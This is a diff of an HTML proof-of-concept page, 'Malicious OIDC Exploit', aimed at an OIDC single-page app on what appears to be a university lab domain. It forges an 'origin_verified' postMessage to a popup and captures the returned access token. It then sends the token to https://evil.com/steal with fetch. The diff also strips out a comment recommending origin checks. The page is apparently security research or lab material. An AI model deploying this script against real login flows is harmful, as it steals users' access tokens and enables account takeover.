@@ -4,70 +4,51 @@
     <meta charset="UTF-8">
     <title>Malicious OIDC Exploit</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        #tokenLog {
-            margin-top: 1em;
-            padding: 1em;
-            background: #f0f0f0;
-            border: 1px solid #ccc;
-            white-space: pre-wrap;
-        }
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #tokenLog { margin-top: 1em; padding: 1em; background: #f0f0f0; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
     <h1>Malicious OIDC Exploit</h1>
-    <p>
-        When the victim clicks below, we open the IdP’s login flow. If they’re already
-        logged in, the IdP might immediately post the token/code back to this page
-        via <code>window.postMessage</code>.
-    </p>
+    <p>Click the button to start the attack:</p>
     <button id="stealTokenBtn">Steal the Victim’s Token</button>
 
     <h2>Captured Token/Response:</h2>
     <div id="tokenLog">(none yet)</div>
 
     <script>
-        // Target OAuth authorization URL (modify accordingly)
-        const authorizeUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml
-      ?scope=profile+email+calendar+passwords+photos
-      &response_type=code
-      &redirect_uri=https%3A%2F%2Fsp%2Delearning%2Ecloud%2Ends%2Erub%2Ede%3A443%2Foidc%5Fsp%2Fspa%2Fverify
-      &state=27ef0580-b028-4b24-94e5-c643f141fbbf
-      &code_challenge_method=S256
-      &client_id=spa-1
-      &code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0
-      &response_mode=web_message
-      &idp_verifier=spa-s1`.replace(/\s+/g, '');
+        // 1️⃣ Open the real SPA login flow
+        const authorizeUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v5&sp_id=spa-1`;
+        let popupWindow;
 
-        // Open OAuth login flow in a new window
         document.getElementById("stealTokenBtn").addEventListener("click", () => {
-            window.open(authorizeUrl, "_blank", "width=800,height=600");
+            popupWindow = window.open(authorizeUrl, "_blank", "width=800,height=600");
+
+            // 2️⃣ Send fake `origin_verified` before the real SPA does
+            setTimeout(() => {
+                if (popupWindow) {
+                    popupWindow.postMessage({ jsonrpc: "2.0", method: "origin_verified" }, "*");
+                    console.log("[Attack] Sent fake `origin_verified` to SPA.");
+                }
+            }, 2000);
         });
 
-        // Listen for postMessage events
+        // 3️⃣ Listen for `postMessage()` responses from the SPA
         window.addEventListener("message", function (event) {
-            console.log("Received OAuth response:", event);
+            console.log("[Attack] Intercepted Message:", event);
 
-            // ⚠️ If the SPA does NOT check event.origin, an attacker can steal the token!
-            // ✅ Best practice: Check that the message comes from a trusted domain
-            // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
-            //     console.warn("Untrusted message origin:", event.origin);
-            //     return;
-            // }
+            // If we receive an access token, capture it
+            if (event.data.tokens?.accessToken?.value) {
+                const token = event.data.tokens.accessToken.value;
+                document.getElementById("tokenLog").textContent = `Stolen Token: ${token}`;
 
-            // Display captured token on the page
-            const tokenLogDiv = document.getElementById("tokenLog");
-            tokenLogDiv.textContent = "Received OAuth Response:\n" + event.data;
-
-            // Optionally, exfiltrate token to attacker's server
-            fetch("https://evil.com/steal", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: event.data
-            });
+                // Exfiltrate to attacker's server
+                fetch("https://evil.com/steal", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ accessToken: token })
+                });
+            }
         });
     </script>
 </body>
